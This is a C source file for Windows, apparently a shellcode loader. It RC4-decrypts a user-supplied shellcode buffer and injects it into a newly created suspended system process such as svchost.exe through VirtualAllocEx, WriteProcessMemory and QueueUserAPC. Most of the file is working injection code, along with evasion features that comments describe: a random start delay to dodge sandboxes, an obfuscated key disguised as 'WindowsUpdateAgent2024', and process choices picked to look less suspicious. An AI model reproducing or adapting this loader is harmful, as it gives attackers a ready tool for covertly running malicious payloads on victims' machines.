#include <Windows.h>
#include <stdio.h>

#define TARGET_PROCESS        "svchost.exe"
#define DECRYPTION_KEY        "WindowsUpdateAgent2024"
#define KEY_LENGTH            22

#pragma warning (disable:4996)

// RC4 Implementation
typedef struct {
    unsigned char S[256];
    int i, j;
} RC4_CTX;

void rc4_init(RC4_CTX *ctx, const unsigned char *key, int keylen) {
    ctx->i = ctx->j = 0;
    
    for (int i = 0; i < 256; i++) {
        ctx->S[i] = i;
    }
    
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % keylen]) & 255;
        unsigned char temp = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = temp;
    }
}

unsigned char rc4_byte(RC4_CTX *ctx) {
    ctx->i = (ctx->i + 1) & 255;
    ctx->j = (ctx->j + ctx->S[ctx->i]) & 255;
    
    unsigned char temp = ctx->S[ctx->i];
    ctx->S[ctx->i] = ctx->S[ctx->j];
    ctx->S[ctx->j] = temp;
    
    return ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) & 255];
}

void rc4_decrypt(unsigned char *data, int datalen, const unsigned char *key, int keylen) {
    RC4_CTX ctx;
    rc4_init(&ctx, key, keylen);
    
    for (int i = 0; i < datalen; i++) {
        data[i] ^= rc4_byte(&ctx);
    }
}

unsigned char encrypted_shellcode[] = {
// Put Your encypted Shellcode here //
};
unsigned int shellcode_size = sizeof(encrypted_shellcode);



// XOR fallback decryption (alternative to RC4)
void xor_decrypt(unsigned char *data, unsigned int size, const char *key) {
    for (unsigned int i = 0; i < size; i++) {
        data[i] ^= key[i % strlen(key)];
        data[i] = (data[i] >> 4) | (data[i] << 4); // Swap nibbles
        data[i] = ~data[i]; // Bitwise NOT
    }
}

// Helper function to generate random delays
void random_delay() {
    // Get somewhat random value from system
    SYSTEMTIME st;
    GetSystemTime(&st);
    DWORD seed = st.wMilliseconds;
    
    // Simple pseudo-random
    seed = (seed * 1103515245 + 12345) & 0x7fffffff;
    DWORD delay = 1000 + (seed % 4000); // 1-5 second delay
    
    Sleep(delay);
}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {
    SIZE_T    sNumberOfBytesWritten = NULL;
    DWORD    dwOldProtection = NULL;
    DWORD    dwNewProtection = PAGE_EXECUTE_READ;

    // Allocate memory with random size padding
    SIZE_T paddedSize = sSizeOfShellcode + (GetTickCount() % 1024);
    *ppAddress = VirtualAllocEx(hProcess, NULL, paddedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (*ppAddress == NULL) {
        return FALSE;
    }

    // Write shellcode
    if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        VirtualFreeEx(hProcess, *ppAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
        // Fallback to RWX if needed
        VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection);
    }

    return TRUE;
}

BOOL CreateSuspendedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {
    CHAR                    lpPath[MAX_PATH * 2];
    CHAR                    WnDr[MAX_PATH];
    STARTUPINFOA            Si = { 0 };
    PROCESS_INFORMATION        Pi = { 0 };

    Si.cb = sizeof(STARTUPINFOA);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        return FALSE;
    }

    // Construct path to system32
    sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);

    // Create suspended process without debug flag
    if (!CreateProcessA(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,  // Changed from DEBUG_PROCESS
        NULL,
        NULL,
        &Si,
        &Pi)) {
        return FALSE;
    }

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    return (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL);
}

// Get a semi-random process name from a list
const char* GetTargetProcess() {
    const char* processes[] = {
        "svchost.exe",
        "dllhost.exe",
        "rundll32.exe",
        "explorer.exe",
        "notepad.exe"  // Added less suspicious option
    };
    
    DWORD tick = GetTickCount();
    int index = tick % (sizeof(processes) / sizeof(processes[0]));
    
    return processes[index];
}

char* GetDecryptionKey() {
    // Obfuscate the key in memory
    static char key[KEY_LENGTH + 1];
    const char obfuscated[] = {
        'W' ^ 0x55, 'i' ^ 0x55, 'n' ^ 0x55, 'd' ^ 0x55, 'o' ^ 0x55, 'w' ^ 0x55, 's' ^ 0x55,
        'U' ^ 0x55, 'p' ^ 0x55, 'd' ^ 0x55, 'a' ^ 0x55, 't' ^ 0x55, 'e' ^ 0x55, 'A' ^ 0x55,
        'g' ^ 0x55, 'e' ^ 0x55, 'n' ^ 0x55, 't' ^ 0x55, '2' ^ 0x55, '0' ^ 0x55, '2' ^ 0x55,
        '4' ^ 0x55, 0
    };
    
    for (int i = 0; i < KEY_LENGTH; i++) {
        key[i] = obfuscated[i] ^ 0x55;
    }
    key[KEY_LENGTH] = 0;
    
    return key;
}

int main() {
    HANDLE hProcess = NULL, hThread = NULL;
    DWORD dwProcessId = NULL;
    PVOID pAddress = NULL;
    
    // Random delay at start to avoid sandbox detection
    random_delay();
    
    // Get target process dynamically
    const char* targetProcess = GetTargetProcess();
    
    // Create suspended process
    if (!CreateSuspendedProcess(targetProcess, &dwProcessId, &hProcess, &hThread)) {
        // Try fallback process
        targetProcess = "notepad.exe";
        if (!CreateSuspendedProcess(targetProcess, &dwProcessId, &hProcess, &hThread)) {
            return 1;
        }
    }
    
    PBYTE shellcode_copy = (PBYTE)LocalAlloc(LPTR, shellcode_size);
    if (!shellcode_copy) {
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return 1;
    }
    
    memcpy(shellcode_copy, encrypted_shellcode, shellcode_size);
    
    // Get decryption key
    const char* key = GetDecryptionKey();
    
    // Decrypt using RC4
    rc4_decrypt(shellcode_copy, shellcode_size, (unsigned char*)key, strlen(key));
    
    // Alternative: XOR decryption (uncomment if needed)
    // xor_decrypt(shellcode_copy, shellcode_size, key);
    
    // Inject shellcode
    if (!InjectShellcodeToRemoteProcess(hProcess, shellcode_copy, shellcode_size, &pAddress)) {
        LocalFree(shellcode_copy);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return 1;
    }
    
    // Execute via APC
    QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);
    
    // Resume thread
    ResumeThread(hThread);
    
    // Add some cleanup delay
    Sleep(500);
    
    // Cleanup
    LocalFree(shellcode_copy);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return 0;
}

